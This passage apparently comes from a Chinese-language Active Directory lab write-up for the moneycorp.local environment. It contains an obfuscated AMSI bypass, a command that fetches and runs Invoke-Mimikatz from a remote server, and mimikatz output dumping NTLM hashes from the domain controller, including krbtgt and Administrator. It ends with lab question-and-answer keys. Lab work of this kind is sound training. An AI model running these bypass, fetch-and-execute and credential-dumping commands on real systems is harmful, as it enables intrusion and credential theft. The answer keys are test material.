+"g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`U
+Ll},${t`RuE} )
+PS C:\Windows\system32>
+```
+
+在mcorp-dc，把mimikatz从远程服务器导入到内存中
+```
+iex (iwr http://172.16.100.66/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+
+dump出mcorp-dc中的所有用户的哈希
+```
+PS C:\Windows\system32> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # lsadump::lsa /patch
+Domain : mcorp / S-1-5-21-280534878-1496970234-700767426
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 71d04f9d50ceb1f64de7a09f23e6dc4c
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : ed277dd7a7a8a88d9ea0de839e454690
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+LM   :
+NTLM :
+
+RID  : 0000b221 (45601)
+User : root359user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b222 (45602)
+User : root360user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b223 (45603)
+User : root361user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b224 (45604)
+User : root362user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b225 (45605)
+User : root363user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b226 (45606)
+User : root364user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b227 (45607)
+User : root365user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b228 (45608)
+User : root366user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b229 (45609)
+User : root367user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22a (45610)
+User : root368user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22b (45611)
+User : root369user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 0000b22c (45612)
+User : root370user
+LM   :
+NTLM : aa5f1b91907b8b180a7e8478313e71ad
+
+RID  : 000003e8 (1000)
+User : MCORP-DC$
+LM   :
+NTLM : 1c48ee2123767b65b76d1348360e83f7
+
+RID  : 00000835 (2101)
+User : DCORP-STDADMIN$
+LM   :
+NTLM : 61608ac9d5219aa8ad8c8cf0f547ec2a
+
+RID  : 0000044f (1103)
+User : dcorp$
+LM   :
+NTLM : 13d28ca9e5863231c89eda2b2b1756d7
+```
+
+问题：NTLM hash of krbtgt of moneycorp.local
+答案：ed277dd7a7a8a88d9ea0de839e454690
+
+问题：NTLM hash of enterprise administrator - Administrator
+答案：71d04f9d50ceb1f64de7a09f23e6dc4c
+
+问题：Privileges on mcorp-dc after executing scheduled task
+答案：nt authority\system
+
+问题：Service for which a TGS is requested from eurocorp-dc
+答案：CIFS（这题应该是Learning Objective - 21）
